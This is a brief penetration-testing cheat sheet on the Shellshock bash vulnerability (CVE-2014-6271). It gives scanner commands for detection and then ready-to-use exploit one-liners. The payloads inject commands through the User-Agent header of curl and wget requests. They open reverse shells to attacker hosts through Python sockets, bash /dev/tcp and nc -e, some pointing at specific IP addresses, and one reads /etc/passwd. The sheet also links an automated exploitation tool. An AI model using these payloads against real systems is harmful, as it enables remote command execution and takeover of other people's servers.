## Shell Shock
### Detect

```
nikto -h http://<IP>/
OR
nmap <IP> -p 80 --script=http-shellshock --script-args uri=/cgi-bin/admin.cgi
```

### Attack

```
wget -qO- -U "() { test;};echo "Content-type: text/plain"; echo; echo; /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.0.235",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 2>&1" http://<IP>/cgi-bin/admin.cgi
OR
curl -H "User-Agent: () { :; }; /bin/bash -c 'echo aaaa;  bash -i >& /dev/tcp/<Attacker IP>/4444 0>&1; echo zzzz;'" http://<Victim-IP>/cgi-bin/admin.cgi -s | sed -n '/aaaa/{:a;n;/zzzz/b;p;ba}'
```

### Shellshock - CVE-2014-6271

```
Apache mod_cgi or any CGI information ? Could be vulnerable to shellshock
# Shellshock == CVE-2014-6271

# Classic PoC
curl -H "User-Agent: () { :; }; /bin/command" http://example.com/
() {:;}; /bin/cat /etc/passwd

# Reverse shell
() { :; }; /bin/sh -c /bin/sh -i  >& /dev/tcp/139.99.169.198/51337 0>&1 &

# Reverse Shell
curl -H "User-Agent: () { :;};echo content-type:text/plain;echo;/bin/nc 51.75.29.235 2222 -e /bin/bash;echo;exit" http://vuln.com/script.cgi

# Automatic tool : shellshocker.py
https://github.com/liamim/shellshocker

```